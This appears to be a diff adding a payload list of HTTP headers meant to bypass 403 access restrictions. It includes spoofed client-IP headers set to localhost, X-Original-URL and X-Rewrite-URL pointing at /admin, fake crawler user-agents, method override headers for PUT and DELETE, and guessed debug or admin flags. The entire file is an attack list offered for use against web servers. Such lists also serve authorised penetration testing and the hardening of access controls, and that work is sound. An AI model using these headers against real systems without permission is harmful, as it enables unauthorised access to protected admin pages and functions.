@@ -1,0 +1,74 @@
+# Header-based 403 Bypass Payloads
+# Add these headers to requests that return 403
+# Format: Header-Name: value
+
+# IP Spoofing Headers (bypass IP whitelists)
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 192.168.0.1
+X-Forwarded-For: 172.16.0.1
+X-Forwarded-For: 0.0.0.0
+
+X-Real-IP: 127.0.0.1
+X-Real-IP: localhost
+
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+X-Custom-IP-Authorization: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+
+# Host header manipulation
+X-Host: localhost
+X-Forwarded-Host: localhost
+X-ProxyUser-Ip: 127.0.0.1
+
+# Referer manipulation (some apps check referer)
+Referer: https://target.com/admin
+Referer: https://admin.target.com/
+
+# Content-Type manipulation
+Content-Type: application/json
+Content-Type: application/xml
+Content-Type: text/plain
+Content-Type: application/x-www-form-urlencoded
+
+# Accept header manipulation
+Accept: application/json
+Accept: application/xml
+Accept: text/html
+
+# User-Agent manipulation (some apps whitelist certain agents)
+User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
+User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
+User-Agent: internal-scanner
+
+# Method override headers
+X-HTTP-Method-Override: PUT
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method-Override: PATCH
+X-HTTP-Method: PUT
+X-Method-Override: PUT
+
+# Miscellaneous
+X-Original-Method: GET
+X-Requested-With: XMLHttpRequest
+X-Requested-With: internal
+Cache-Control: no-cache
+Pragma: no-cache
+
+# Debug/Admin headers (sometimes enable debug mode)
+X-Debug: 1
+X-Debug-Mode: true
+Debug: true
+X-Test: true
+X-Admin: true
+X-Bypass: true
